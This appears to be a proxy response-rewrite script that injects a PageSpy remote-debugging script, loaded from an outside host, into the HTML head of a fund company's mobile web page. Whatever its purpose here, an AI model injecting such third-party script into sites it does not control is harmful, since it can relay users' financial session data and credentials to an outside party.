var body = $response.body;
console.log($response);
var url = $request.url;

if (body) {
  if(url=='https://wx.rtfund.com/gbusweb/msitepro/'){
    body = body.replace('</head>',`<script crossorigin="anonymous" src="https://warp.xylucky.top/page-spy/index.min.js"></script>
<script>
  window.$pageSpy = new PageSpy();
</script>
</head>`)
  }
  $done({ body: body });
} else {
  $done({})
}
